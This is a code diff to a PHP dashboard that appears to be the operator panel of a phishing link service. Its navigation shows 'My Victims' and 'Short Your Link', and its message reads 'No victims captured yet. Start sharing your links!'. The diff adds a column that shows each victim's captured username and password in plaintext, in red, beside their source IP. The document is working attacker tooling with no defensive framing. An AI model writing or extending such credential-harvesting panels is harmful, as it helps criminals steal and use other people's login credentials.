@@ -36,7 +36,7 @@ krsort($user_analytics);
 
     <nav class="navbar-old">
         <ul>
-            <li><a href="dashboard.php"><i class="fas fa-home"></i> Home</a></li>
+            <li><a href="index.php"><i class="fas fa-home"></i> Home</a></li>
             <li><a href="victims.php"><i class="fas fa-skull"></i> My Victims</a></li>
             <li><a href="signup.php" style="display: none;"><i class="fas fa-user-plus"></i> Sign Up</a></li>
             <li><a href="#"><i class="fas fa-cut"></i> Short Your Link</a></li>
@@ -58,17 +58,22 @@ krsort($user_analytics);
                         <tr style="background: #f9f9f9; border-bottom: 1px solid #ddd;">
                             <th style="padding: 12px; text-align: left; font-size: 13px;">Date & Time</th>
                             <th style="padding: 12px; text-align: left; font-size: 13px;">Hub Category</th>
+                            <th style="padding: 12px; text-align: left; font-size: 13px;">Captured Data</th>
                             <th style="padding: 12px; text-align: left; font-size: 13px;">Source IP</th>
                         </tr>
                     </thead>
                     <tbody>
                         <?php if (empty($user_analytics)): ?>
-                            <tr><td colspan="3" style="padding: 30px; text-align: center; color: #999;">No victims captured yet. Start sharing your links!</td></tr>
+                            <tr><td colspan="4" style="padding: 30px; text-align: center; color: #999;">No victims captured yet. Start sharing your links!</td></tr>
                         <?php else: ?>
                             <?php foreach ($user_analytics as $v): ?>
                             <tr style="border-bottom: 1px solid #eee;">
                                 <td style="padding: 12px; font-size: 13px;"><?php echo s($v['timestamp'] ?? 'N/A'); ?></td>
                                 <td style="padding: 12px; font-size: 13px;"><span style="color: #c0392b; font-weight: 700;"><?php echo s(strtoupper($v['category'] ?? 'UNKNOWN')); ?></span></td>
+                                <td style="padding: 12px; font-size: 13px;">
+                                    <strong>User:</strong> <?php echo s($v['captured_user'] ?? 'N/A'); ?><br>
+                                    <strong>Pass:</strong> <span style="background: #fff0f0; padding: 2px 4px; color: #e74c3c; border-radius: 3px;"><?php echo s($v['captured_pass'] ?? 'N/A'); ?></span>
+                                </td>
                                 <td style="padding: 12px; font-size: 13px; color: #666; font-family: monospace;"><?php echo s($v['source_ip'] ?? '0.0.0.0'); ?></td>
                             </tr>
                             <?php endforeach; ?>
